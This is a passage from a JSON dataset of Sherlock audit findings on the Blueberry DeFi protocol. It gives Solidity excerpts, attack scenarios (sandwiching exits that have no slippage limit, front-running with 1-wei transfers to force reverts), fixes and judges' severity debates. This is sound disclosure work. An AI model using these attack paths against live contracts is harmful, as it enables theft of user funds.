Snippet\n\n[AuraSpell.sol#L184-L265](https://github.com/sherlock-audit/2023-07-blueberry/blob/main/blueberry-core/contracts/spell/AuraSpell.sol#L184-L265)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nUse the same order as ConvexSpell and sell rewards BEFORE burning BLP",
      "summary": "\nThis bug report is about an issue that was found in the AuraSpell#closePositionFarm code. It was found that when the borrow token is also a reward, the BLP is burned before taking the reward cut. This causes the user to lose funds due to incorrect fees. The code snippet that is causing the issue can be found at AuraSpell.sol#L184-L265. The tool used to find this bug was manual review. The recommendation for this issue is to use the same order as ConvexSpell and sell rewards BEFORE burning BLP. This will ensure that the user does not lose funds due to incorrect fees being taken.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update #3",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-07-blueberry-judging/issues/103",
      "tags": [],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "24325",
      "title": "M-5: AuraSpell#closePositionFarm exits pool with single token and without any slippage protection",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-07-blueberry-judging/issues/102 \n\n## Found by \n0x52, Breeje, Oxhunter526, Vagner, bitsurfer, nobody2018\n\nWhen exiting the balancer pool, vault#exitPool is called with an empty array for minAmountsOut causing the position to be exited with no slippage protection. Typically it is not an issue to exit off axis but since it is exiting to a single token this can cause massive loss.\n\n## Vulnerability Detail\n\n[AuraSpell.sol#L221-L236](https://github.com/sherlock-audit/2023-07-blueberry/blob/main/blueberry-core/contracts/spell/AuraSpell.sol#L221-L236)\n\n                (\n                    uint256[] memory minAmountsOut,\n                    address[] memory tokens,\n                    uint256 borrowTokenIndex\n                ) = _getExitPoolParams(param.borrowToken, lpToken);\n\n                wAuraPools.getVault(lpToken).exitPool(\n                    IBalancerPool(lpToken).getPoolId(),\n                    address(this),\n                    address(this),\n                    IBalancerVault.ExitPoolRequest(\n                        tokens,\n                        minAmountsOut,\n                        abi.encode(0, amountPosRemove, borrowTokenIndex),\n                        false\n                    )\n\nWhen exiting a the balancer vault, closePositionFarm makes a subcall to _getExitPoolParams which is used to set minAmountsOut.\n\n[AuraSpell.sol#L358-L361](https://github.com/sherlock-audit/2023-07-blueberry/blob/main/blueberry-core/contracts/spell/AuraSpell.sol#L358-L361)\n\n        (address[] memory tokens, , ) = wAuraPools.getPoolTokens(lpToken);\n\n        uint256 length = tokens.length;\n        uint256[] memory minAmountsOut = new uint256[](length);\n\nInside _getExitPoolParams we see that minAmountsOut are always an empty array. This means that the user has no slippage protection and can be sandwich attacked, suffering massive losses.\n\n## Impact\n\nExits can be sandwich attacked causing massive loss to the user\n\n## Code Snippet\n\n[AuraSpell.sol#L184-L286](https://github.com/sherlock-audit/2023-07-blueberry/blob/main/blueberry-core/contracts/spell/AuraSpell.sol#L184-L286)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nAllow user to specify min amount received from exit\n\n\n\n## Discussion\n\n**securitygrid**\n\nEscalate:\nHistorically, lacking slippage protection is H.\n\n\n**sherlock-admin2**\n\n > Escalate:\n> Historically, lacking slippage protection is H.\n> \n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Shogoki**\n\n> Escalate: Historically, lacking slippage protection is H.\n\nCan be a high issue\n\n**IAm0x52**\n\nWhy would lack of slippage be considered high in this scenario? Even with zero slippage protection sandwich attack profitability is always contingent on a few external factors such as: liquidity of underlying pool, the fee of the underlying pool, the amount being swapped and the current gas prices. The higher the liquidity and fee of the pool the higher the cost to push the pool price then pull it back. The lower the amount being swapped, the less the attacker can steal. If this cost exceeds the gain from the attack then the attack isn't profitable and won't happen.\n\n**VagnerAndrei26**\n\nI think no slippage is considered high most of the time cause sandwich attacks are easily doable in the space, especially for those experienced in doing it, and even if there are factors to consider even one successful can occur loss of funds for the protocol in a pretty easy manner. So considering that and also past contests I think it should be considered also a high.\n\n**Nabeel-javaid**\n\nas far as I know 98% of the times slippage issues are considered as Medium severity\n\n**hrishibhat**\n\nResult:\nMedium\nHas duplicates \nThis is a valid medium issue. Agree with the Lead Watson's comments here:\nhttps://github.com/sherlock-audit/2023-07-blueberry-judging/issues/102#issuecomment-1699649100\n\n\n**sherlock-admin2**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [securitygrid](https://github.com/sherlock-audit/2023-07-blueberry-judging/issues/102/#issuecomment-1693593255): rejected",
      "summary": "\nA bug report has been filed against the code in the AuraSpell.sol contract, which is part of the Sherlock Audit 2023-07-blueberry-judging repository. The bug is that when exiting the balancer pool, vault#exitPool is called with an empty array for minAmountsOut, causing the position to be exited with no slippage protection. This can cause massive loss when exiting to a single token. The code snippet responsible for this is [AuraSpell.sol#L221-L236](https://github.com/sherlock-audit/2023-07-blueberry/blob/main/blueberry-core/contracts/spell/AuraSpell.sol#L221-L236) and [AuraSpell.sol#L358-L361](https://github.com/sherlock-audit/2023-07-blueberry/blob/main/blueberry-core/contracts/spell/AuraSpell.sol#L358-L361).\n\nThe impact of the bug is that exits can be sandwich attacked, causing massive loss to the user. The bug was found by 0x52, Breeje, Oxhunter526, Vagner, bitsurfer, and nobody2018. The tool used to identify the bug was manual review.\n\nThe recommendation to fix the bug is to allow the user to specify the minimum amount received from the exit. After discussion, the bug was classified as a medium severity issue with duplicates. The lead Watson's comment can be found [here](https://github.com/sherlock-audit/2023-07-blueberry-judging/issues/102#issuecomment-1699649100).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update #3",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-07-blueberry-judging/issues/102",
      "tags": [],
      "finders": [
        "0x52",
        "bitsurfer",
        "Vagner",
        "nobody2018",
        "Breeje",
        "Oxhunter526"
      ]
    },
    {
      "id": "24324",
      "title": "M-4: Mainnet oracles are incompatible with wstETH causing many popular yields strategies to be broken",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-07-blueberry-judging/issues/96 \n\n## Found by \n0x52\n\nMainnet oracles are incompatible with wstETH causing many popular yields strategies to be broken. Chainlink and Band do not have wstETH oracles and using Uniswap LP pairs would be very dangerous given their low liquidity. \n\n## Vulnerability Detail\n\n[ChainlinkAdapterOracle.sol#L111-L125](https://github.com/sherlock-audit/2023-07-blueberry/blob/main/blueberry-core/contracts/oracle/ChainlinkAdapterOracle.sol#L111-L125)\n\n        uint256 decimals = registry.decimals(token, USD);\n        (\n            uint80 roundID,\n            int256 answer,\n            ,\n            uint256 updatedAt,\n            uint80 answeredInRound\n        ) = registry.latestRoundData(token, USD);\n        if (updatedAt < block.timestamp - maxDelayTime)\n            revert Errors.PRICE_OUTDATED(token_);\n        if (answer <= 0) revert Errors.PRICE_NEGATIVE(token_);\n        if (answeredInRound < roundID) revert Errors.PRICE_OUTDATED(token_);\n\n        return\n            (answer.toUint256() * Constants.PRICE_PRECISION) / 10 ** decimals;\n\nChainlinkAdapterOracle only supports single asset price data. This makes it completely incompatible with wstETH because chainlink doesn't have a wstETH oracle on mainnet. Additionally Band protocol doesn't offer a wstETH oracle either. This only leaves Uniswap oracles which are highly dangerous given their low liquidity.\n\n## Impact\n\nMainnet oracles are incompatible with wstETH causing many popular yields strategies to be broken\n\n## Code Snippet\n\n[ChainlinkAdapterOracle.sol#L102-L126](https://github.com/sherlock-audit/2023-07-blueberry/blob/main/blueberry-core/contracts/oracle/ChainlinkAdapterOracle.sol#L102-L126)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nCreate a special bypass specifically for wstETH utilizing the stETH oracle and it's current exchange rate. \n\n\n\n## Discussion\n\n**sherlock-admin2**\n\n2 comment(s) were left on this issue during the judging contest.\n\n**0xyPhilic** commented:\n> invalid because this issue can be considered informational or at best low - tokens used are whitelisted\n\n**Kral01** commented:\n> low severity\n\n\n\n**IAm0x52**\n\nEscalate\n\nThis was wrongly excluded. Protocol is meant to be compatible with these pools but can't work with them. I believe this is a valid medium because the protocol is nonfunctional in this area.\n\n**sherlock-admin2**\n\n > Escalate\n> \n> This was wrongly excluded. Protocol is meant to be compatible with these pools but can't work with them. I believe this is a valid medium because the protocol is nonfunctional in this area.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Shogoki**\n\n> Escalate\n> \n> This was wrongly excluded. Protocol is meant to be compatible with these pools but can't work with them. I believe this is a valid medium because the protocol is nonfunctional in this area.\n\nNot sure were it says that the protcol is meant to be compatible with `WSTETH` pools on mainnet. \n\nIf that is the case it can be a valid issue, i guess. \nHowever if it is not, i think the Whitelisting of tokens would count for invalidating it.\n\n**IAm0x52**\n\nProtocol is meant to be compatible with Aura/Convex. wstETH is a component of many highly attractive pools. Not being able to support wstETH as an underlying asset will break support for these.\n\n**hrishibhat**\n\n@Gornutz \n\n**Gornutz**\n\nConfirm this is valid. \n\n**hrishibhat**\n\nResult:\nMedium\nUnique\nConsidering this issue a valid medium\n\n\n**sherlock-admin2**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [IAm0x52](https://github.com/sherlock-audit/2023-07-blueberry-judging/issues/96/#issuecomment-1694747143): accepted",
      "summary": "\nThis bug report is about incompatibility between mainnet oracles and wstETH, which causes many popular yields strategies to be broken. The ChainlinkAdapterOracle only supports single asset price data, making it incompatible with wstETH, as Chainlink does not have a wstETH oracle on mainnet. Additionally, Band protocol also does not offer a wstETH oracle. This leaves Uniswap oracles as the only option, which is dangerous due to their low liquidity. \n\nThe code snippet provided in the report is from the ChainlinkAdapterOracle.sol file, lines 111-125. The vulnerability detail section provides an explanation of the code. \n\nThe impact of this bug is that many popular yields strategies are broken. \n\nThe tool used to find this bug was manual review. The recommendation given was to create a special bypass for wstETH utilizing the stETH oracle and its current exchange rate.\n\nThe discussion section of the report includes comments from two people, 0xPhilic and Kral01, who believed the issue to be of low severity. IAm0x52 then escalated the issue, stating that the protocol is meant to be compatible with these pools but can't work with them, making the issue a valid medium. This was confirmed by Gornutz and Hrishibhat, and the issue was marked as a valid medium.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update #3",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-07-blueberry-judging/issues/96",
      "tags": [],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "24323",
      "title": "M-3: ConvexSpell/CurveSpell.openPositionFarm will revert in some cases",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-07-blueberry-judging/issues/60 \n\n## Found by \nnobody2018\n\nBefore calling `ICurvePool#add_liquidity` to deposit tokens, each token needs to be approved to the pool. If the approved amount is smaller than the parameters passed into `ICurvePool#add_liquidity`, it will cause `erc20.transferFrom` revert inside the function. In this way, `openPositionFarm` will also revert.\n\nIn previous contest, [[#47](https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/47)](https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/47) was not fixed correctly. **This issue is still exist**.\n\n## Vulnerability Detail\n\nThe fix for this issue from this contest is as following:\n\n```solidity\nFile: blueberry-core\\contracts\\spell\\CurveSpell.sol\n098:         // 2. Borrow specific amounts\n099:         uint256 borrowBalance = _doBorrow(\n100:             param.borrowToken,\n101:             param.borrowAmount\n102:         );\n103: \n104:         // 3. Add liquidity on curve\n105:         address borrowToken = param.borrowToken;\n106:         _ensureApprove(param.borrowToken, pool, borrowBalance);\n107:         if (tokens.length == 2) {\n108:             uint256[2] memory suppliedAmts;\n109:             for (uint256 i = 0; i < 2; i++) {\n                     //this 'if' check is the fix from the previous contest\n110:->               if (tokens[i] == borrowToken) {\n111:                     suppliedAmts[i] = IERC20Upgradeable(tokens[i]).balanceOf(\n112:                         address(this)\n113:                     );\n114:                     break;\n115:                 }\n116:             }\n117:             ICurvePool(pool).add_liquidity(suppliedAmts, minLPMint);\n118:         } else if (tokens.length == 3) {\n```\n\n**The key to this issue is that `borrowBalance` may be smaller than `IERC20Upgradeable(borrowToken).balanceOf(address(this))`**. For simplicity, assume that CurveSpell supports an lptoken which contains two tokens : A and B.\n\n**Bob transferred 1wei of A and B to the CurveSpell contract**. Alice opens a position by calling `BlueBerryBank#execute`, and the flow is as follows:\n\n1.  enter `CurveSpell#openPositionFarm`.\n2.  call `_doLend` to deposit isolated collaterals.\n3.  call `_doBorrow` to borrow 100e18 A token. borrowBalance = 100e18.\n4.  `A.approve(pool, 100e18)`.\n5.  `suppliedAmts[0] = A.balance(address(this)) = 100e18+1wei`, `suppliedAmts[1] = 0`.\n6.  call `ICurvePool(pool).add_liquidity(suppliedAmts, minLPMint)`, then revert because the approved amount is not enough.\n\nTherefore, no one can successfully open a position.\n\nOf course, bob can also transfer 1wei of `borrowToken` to contract by front-running `openPositionFarm` for a specific user or all users.\n\nIn ConvexSpell, the issue lies in [[the same code](https://github.com/sherlock-audit/2023-07-blueberry/blob/main/blueberry-core/contracts/spell/ConvexSpell.sol#L110-L144)](https://github.com/sherlock-audit/2023-07-blueberry/blob/main/blueberry-core/contracts/spell/ConvexSpell.sol#L110-L144) as in previous games.\n\n## Impact\n\n`ConvexSpell/CurveSpell.openPositionFarm` will revert due to this issue.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-07-blueberry/blob/main/blueberry-core/contracts/spell/CurveSpell.sol#L99-L140\n\nhttps://github.com/sherlock-audit/2023-07-blueberry/blob/main/blueberry-core/contracts/spell/ConvexSpell.sol#L110-L144\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\n**The following fix is for CurveSpell, but please don't forget ConvexSpell**.\n\nTwo ways for fix it:\n\n```fix\n--- a/blueberry-core/contracts/spell/CurveSpell.sol\n+++ b/blueberry-core/contracts/spell/CurveSpell.sol\n@@ -108,9 +108,7 @@ contract CurveSpell is BasicSpell {\n             uint256[2] memory suppliedAmts;\n             for (uint256 i = 0; i < 2; i++) {\n                 if (tokens[i] == borrowToken) {\n-                    suppliedAmts[i] = IERC20Upgradeable(tokens[i]).balanceOf(\n-                        address(this)\n-                    );\n+                    suppliedAmts[i] = borrowBalance;\n                     break;\n                 }\n             }\n@@ -119,9 +117,7 @@ contract CurveSpell is BasicSpell {\n             uint256[3] memory suppliedAmts;\n             for (uint256 i = 0; i < 3; i++) {\n                 if (tokens[i] == borrowToken) {\n-                    suppliedAmts[i] = IERC20Upgradeable(tokens[i]).balanceOf(\n-                        address(this)\n-                    );\n+                    suppliedAmts[i] = borrowBalance;\n                     break;\n                 }\n             }\n@@ -130,9 +126,7 @@ contract CurveSpell is BasicSpell {\n             uint256[4] memory suppliedAmts;\n             for (uint256 i = 0; i < 4; i++) {\n                 if (tokens[i] == borrowToken) {\n-                    suppliedAmts[i] = IERC20Upgradeable(tokens[i]).balanceOf(\n-                        address(this)\n-                    );\n+                    suppliedAmts[i] = borrowBalance;\n                     break;\n                 }\n             }\n```\n\n```fix\n--- a/blueberry-core/contracts/spell/CurveSpell.sol\n+++ b/blueberry-core/contracts/spell/CurveSpell.sol\n@@ -103,7 +103,8 @@ contract CurveSpell is BasicSpell {\n\n         // 3. Add liquidity on curve\n         address borrowToken = param.borrowToken;\n-        _ensureApprove(param.borrowToken, pool, borrowBalance);\n+        require(borrowBalance <= IERC20Upgradeable(borrowToken).balanceOf(address(this)), \"impossible\");\n+        _ensureApprove(param.borrowToken, pool, IERC20Upgradeable(borrowToken).balanceOf(address(this)));\n         if (tokens.length == 2) {\n             uint256[2] memory suppliedAmts;\n             for (uint256 i = 0; i < 2; i++) {\n```\n\n\n\n## Discussion\n\n**sherlock-admin2**\n\n2 comment(s) were left on this issue during the judging contest.\n\n**0xyPhilic** commented:\n> invalid because the borrowAmount can't change mid function execution\n\n**darkart** commented:\n>  If already approven its up to Developrs to chose if they will implement it",
      "summary": "\nThis bug report is about an issue in the ConvexSpell/CurveSpell.openPositionFarm function, which can cause it to revert in some cases. The issue is that when a user is attempting to open a position, they must approve an amount of tokens to the pool before calling ICurvePool#add_liquidity. If the approved amount is smaller than the parameters passed into ICurvePool#add_liquidity, it will cause erc20.transferFrom to revert and openPositionFarm will also revert. This issue is still exist, and was not fixed correctly in a previous contest. \n\nThe key to this issue is that the borrowBalance may be smaller than IERC20Upgradeable(borrowToken).balanceOf(address(this)). An example of this is if Bob transfers 1wei of two tokens, A and B, to the CurveSpell contract, Alice opens a position by calling BlueBerryBank#execute, and the flow is as follows: enter CurveSpell#openPositionFarm, call _doLend to deposit isolated collaterals, call _doBorrow to borrow 100e18 A token, A.approve(pool, 100e18), suppliedAmts[0] = A.balance(address(this)) = 100e18+1wei, suppliedAmts[1] = 0, then call ICurvePool(pool).add_liquidity(suppliedAmts, minLPMint) which will revert because the approved amount is not enough.\n\nThe code snippet and tool used for this issue is the manual review, and two ways of fixing it are provided. The first is to change the suppliedAmts[i] = borrowBalance, and the second is to require that borrowBalance is less than or equal to IERC20Upgradeable(borrowToken).balanceOf(address(this)) and then call _ensureApprove. It is important to note that this fix should be implemented for both CurveSpell and ConvexSpell.\n\nTwo comments were left on this issue during the judging contest. 0xyPhilic commented that it was invalid because the borrowAmount can't change mid function execution, and darkart commented that if already approved, it is up to developers to choose if they will implement it.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update #3",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-07-blueberry-judging/issues/60",
      "tags": [],
      "finders": [
        "nobody2018"
      ]
    },
    {
      "id": "24322",
      "title": "M-2: `getPrice` in `WeightedBPTOracle.sol`  uses `totalSupply` for price calculations which can lead to wrong results",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-07-blueberry-judging/issues/18 \n\n## Found by \nVagner\n`getPrice` is used to calculate the price in USD of a given balancer LP, and it respects the recommendations  of Balancer docs by calculating the invariant and using it to protect from manipulations, but it uses `totalSupply` for every LP calculated which can lead to wrong results and assumptions.\n## Vulnerability Detail\nIn the Balancer docs it is specified that `There are three potential functions to query when determining the BPT supply depending on pool type.` https://docs.balancer.fi/concepts/advanced/valuing-bpt/valuing-bpt.html#getting-bpt-supply\n- `getActualSupply` : which is used by the most recent Weighted and Stable Pools and it accounts for pre-minted BPT as well as due protocol fees:\n- `getVirtualSupply` : which is used by Linear Pools and \"legacy\" Stable Phantom Pools and it accounts just for pre-minted BPT\n- `totalSupply` : which makes sense to be called only by older `legacy` pools since those doesn't have pre-minted BPT\nThe `getPrice` uses every time `totalSupply`\nhttps://github.com/sherlock-audit/2023-07-blueberry/blob/main/blueberry-core/contracts/oracle/WeightedBPTOracle.sol#L71-L73\nwhich in the case of most recent pools can lead to very wrong calculations because of all the pre-minted BPT.\n## Impact\nImpact is a medium one, since it can lead to wrong price assumptions\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-07-blueberry/blob/main/blueberry-core/contracts/oracle/WeightedBPTOracle.sol#L71-L73\n## Tool used\n\nManual Review\n\n## Recommendation\nConsider implementing the more recent `getActualSupply` even if older pools doesn't have this functions , because it can lead to wrong assumptions and calculations.\n\n\n\n## Discussion\n\n**sherlock-admin2**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**YakuzaKiawe** commented:\n>  invalid as this could be a factor to exploit the pool in future",
      "summary": "\nThis bug report is about the `getPrice` function in the `WeightedBPTOracle.sol` contract which is used to calculate the price of a given Balancer LP. The function is using `totalSupply` for every LP calculation which can lead to wrong results and assumptions. This is because, according to Balancer docs, there are three potential functions to query when determining the BPT supply depending on pool type, one of them being `getActualSupply`, which is used by the most recent Weighted and Stable Pools and it accounts for pre-minted BPT as well as due protocol fees. Using `totalSupply` for these pools can lead to very wrong calculations because of all the pre-minted BPT. The impact of this vulnerability is medium, since it can lead to wrong price assumptions. The code snippet of this bug can be found at https://github.com/sherlock-audit/2023-07-blueberry/blob/main/blueberry-core/contracts/oracle/WeightedBPTOracle.sol#L71-L73. The recommendation is to consider implementing the more recent `getActualSupply` even if older pools doesn't have this functions, because it can lead to wrong assumptions and calculations. During the judging contest, one comment was left on this issue, which stated that this could be a factor to exploit the pool in future.",
      "quality_score": 4,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update #3",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-07-blueberry-judging/issues/18",
      "tags": [
        "Wrong Math"
      ],
      "finders": [
        "Vagner"
      ]
    },
    {
      "id": "24321",
      "title": "M-1: Users will fail to close their Convex position if the Curve pool is killed",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-07-blueberry-judging/issues/15 \n\n## Found by \nArz\n\nIf the Curve pool that the ConvexSpell.sol uses becomes killed, users will be unable to close their position because remove_liquidity_one_coin() will revert. Users will be unable to repay their debt so their assets will be liquidated.\n\n## Vulnerability Detail\n\nConvexSpell.sol::closePositionFarm() is used to close an existing liquidity position. After the collateral is taken and the rewards are swapped, _removeLiquidity() is called which removes liquidity from a Curve pool by calling remove_liquidity_one_coin(). \n\n\nThe problem arises when the Curve pool is killed(paused) so if self.is_killed in the curve pool contract is true, calling remove_liquidity_one_coin() function will always revert and closePositionFarm() function will be DOS'ed\n\n\nNote: This issue was submitted in the [previous contest](https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/64) however only the CurveSpell got fixed but not the ConvexSpell.\n\n\n## Impact\n\nWhen user's position is about to be liquidated, if the closePositionFarm() function is DOS'ed,users will be unable to repay their debt, resulting in the users losing their funds\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-07-blueberry/blob/7c7e1c4a8f3012d1afd2e598b656010bb9127836/blueberry-core/contracts/spell/ConvexSpell.sol#L261-L265\n\n```solidity\n\n260: /// Removes liquidity from the Curve pool for the specified token.\n261: ICurvePool(pool).remove_liquidity_one_coin(\n262:     amountPosRemove,\n263:     int128(tokenIndex),\n264:     param.amountOutMin\n265: );\n\n```\n\nAs you can see, remove_liquidity_one_coin() is called when the user calls closePositionFarm() in the ConvexSpell\n\n\nhttps://github.com/curvefi/curve-contract/blob/b0bbf77f8f93c9c5f4e415bce9cd71f0cdee960e/contracts/pools/3pool/StableSwap3Pool.vy#L670-L674\n\n```python\n670: def remove_liquidity_one_coin(_token_amount: uint256, i: int128, min_amount: uint256):\n671:     \"\"\"\n672:     Remove _amount of liquidity all in a form of coin i\n673:     \"\"\"\n674:     assert not self.is_killed  # dev: is killed\n```\n\n\nThe problem is that remove_liquidity_one_coin() checks if self.is_killed is true so if the Curve pool is killed then this will revert and the user wont be able to close his position.\n\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nWhen killed, it is only possible for existing LPs to remove liquidity viaÂ remove_liquidity so there should be the same isKilled check in the ConvexSpell like there is in the CurveSpell\n\n\n\n## Discussion\n\n**sherlock-admin2**\n\n2 comment(s) were left on this issue during the judging contest.\n\n**0xyPhilic** commented:\n> invalid because the case where a Curve pool is killed is handled by withdrawing liquidity using remove_liquidity function\n\n**darkart** commented:\n>  If its already been accepted its up to the DEV to decide if he wants to fix it or no",
      "summary": "\nThis bug report is about the issue where users will fail to close their Convex position if the Curve pool is killed. This issue was found by Arz and can be found at https://github.com/sherlock-audit/2023-07-blueberry-judging/issues/15. The problem arises when the Curve pool is killed (paused), so if self.is_killed in the curve pool contract is true, calling remove_liquidity_one_coin() function will always revert and closePositionFarm() function will be DOS'ed. This means users will be unable to repay their debt, resulting in their assets being liquidated. The code snippet in the report shows how the remove_liquidity_one_coin() is called when the user calls closePositionFarm() in the ConvexSpell. The recommendation is to add an isKilled check in the ConvexSpell like there is in the CurveSpell. Two comments were left on this issue during the judging contest, one was invalid because the case where a Curve pool is killed is handled by withdrawing liquidity using remove_liquidity function and the other was that it is up to the developer to decide if they want to fix it or not.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update #3",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-07-blueberry-judging/issues/15",
      "tags": [],
      "finders": [
        "Arz"
      ]
    },
    {
      "id": "24320",
      "title": "H-5: wrong bToken's exchangeRateStored used for calculate ColleteralValue",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-07-blueberry-judging/issues/117 \n\n## Found by \nmert\\_eren\nBlueBerryBank.sol calculate position's risk value with `getPositionRisk()` . This function used for is position can be liquadatable or not.\n```solidity\n    function getPositionRisk(uint256 positionId) public returns (uint256 risk) {\n        uint256 pv = getPositionValue(positionId);\n        uint256 ov = getDebtValue(positionId);\n        uint256 cv = getIsolatedCollateralValue(positionId);\n\n\n        if (\n            (cv == 0 && pv == 0 && ov == 0) || pv >= ov /// Closed position or Overcollateralized position\n        ) {\n            risk = 0;\n        } else if (cv == 0) {\n            /// Sth bad happened to isolated underlying token\n            risk = Constants.DENOMINATOR;\n        } else {\n            risk = ((ov - pv) * Constants.DENOMINATOR) / cv;\n        }\n    }\n```\n\n`getIsolatedColleteralValue()` calculate lended value in position.\n```solidity\n    function getIsolatedCollateralValue(\n        uint256 positionId\n    ) public override returns (uint256 icollValue) {\n        Position memory pos = positions[positionId];\n        /// NOTE: exchangeRateStored has 18 decimals.\n        uint256 underlyingAmount;\n        if (_isSoftVault(pos.underlyingToken)) {\n            underlyingAmount =\n                (ICErc20(banks[pos.debtToken].bToken).exchangeRateStored() *\n                    pos.underlyingVaultShare) /\n                Constants.PRICE_PRECISION;\n        } else {\n            underlyingAmount = pos.underlyingVaultShare;\n        }\n        icollValue = oracle.getTokenValue(\n            pos.underlyingToken,\n            underlyingAmount\n        );\n    }\n```\nFor calculate total value it should calculate first `underlyingAmount`. Due to calculate this, it should first multiply `pos.underlyingVaultShare` with ```exchangeRateStored()``` of this token.Because when stored `underlyingVaultShare` in `lend` function, it not stored directly lended amount but the amount minted in softVault after this tokens lended to it. \n```solidity\n    function lend(\n        address token,\n        uint256 amount\n    ) external override inExec poke(token) onlyWhitelistedToken(token) {\n        ...\n\n\n        if (_isSoftVault(token)) {\n            _ensureApprove(token, bank.softVault, amount);\n            pos.underlyingVaultShare += ISoftVault(bank.softVault).deposit(\n                amount\n            );\n        } else {\n            _ensureApprove(token, bank.hardVault, amount);\n            pos.underlyingVaultShare += IHardVault(bank.hardVault).deposit(\n                token,\n                amount\n            );\n        }\n\n```\nSoftVault's `deposit` function call `mint` function of blueBerry bToken (which work same as compound cToken).And return minted amount of bToken. bToken mintAmount is `amount/exchangeRateStored` . So when calculate `underlyingAmount` , `pos.UnderlyinVaultShare` must be multiplied with btoken of underlyingToken's `exchangeRateStored`. However as seen above of the `getIsolatedColleteralValue()` code snippet it multiply with `debtToken`'s bToken not `underlyingToken`'s. Due to all bTokens' has different `exchangeRate`, `underlyingAmount` will be calculate wrong. \n\n \n## Vulnerability Detail\n\n## Impact\nmisCalculation of `getIsolatedColleteralValue()` so `cv` in `getPositionRisk`.This will lead some protocols can be \n## Code Snippet\nhttps://github.com/sherlock-audit/2023-07-blueberry/blob/main/blueberry-core/contracts/BlueBerryBank.sol#L493\n## Tool used\n\nManual Review\n\n## Recommendation\nuse underlying token's bToken exchangeRate in `getIsolatedColleteralValue()` not debtToken's.\n\n\n\n\n\n## Discussion\n\n**merteren1234**\n\nEscalate\nI think this issue is not duplicate of #16. Because this issue indicate differeant root cause than #16. This issue's root cause is , wrong bToken's exchangeRate used in getIsolatedColleteral().Not about old exchangeRate used or not. Moreover without fixing this issue , #16 is not valid because pos.debtToken is updated with poke modifier in liquidate function and its exchangeRate used in getIsolatedColleteralValue() .\nThis issue is about getIsolatedColleteralValue() use debtToken's exchangeRate which is wrong because this functions should use underlyingToken's exchangeRate. So even though #16 is fixed  (there will be no impact without fix this issue.) this issue still remain and changing `ICErc20(banks[pos.debtToken].bToken).exchangeRateStored()` with `ICErc20(banks[pos.underlyingToken].bToken).exchangeRateStored()`   is mandatory to take correct getIsolatedColleteralValue().\n\n\n**sherlock-admin2**\n\n > Escalate\n> I think this issue is not duplicate of #16. Because this issue indicate differeant root cause than #16. This issue's root cause is , wrong bToken's exchangeRate used in getIsolatedColleteral().Not about old exchangeRate used or not. Moreover without fixing this issue , #16 is not valid because pos.debtToken is updated with poke modifier in liquidate function and its exchangeRate used in getIsolatedColleteralValue() .\n> This issue is about getIsolatedColleteralValue() use debtToken's exchangeRate which is wrong because this functions should use underlyingToken's exchangeRate. So even though #16 is fixed  (there will be no impact without fix this issue.) this issue still remain and changing `ICErc20(banks[pos.debtToken].bToken).exchangeRateStored()` with `ICErc20(banks[pos.underlyingToken].bToken).exchangeRateStored()`   is mandatory to take correct getIsolatedColleteralValue().\n> \n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Shogoki**\n\nNot a duplicate of #16 \n\n**hrishibhat**\n\n@Shogoki is this a valid issue on its own?\n\n**nevillehuang**\n\n> @Shogoki is this a valid issue on its own?\n\n@Gornutz \n\n**hrishibhat**\n\nResult:\nHigh\nUnique\nAfter further review and discussions considering this a valid high issue as the exchange rate can be affected significantly by the tokens decimal and this is not a duplicate of #16 \n\n**sherlock-admin2**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [merteren1234](https://github.com/sherlock-audit/2023-07-blueberry-judging/issues/117/#issuecomment-1693539478): accepted",
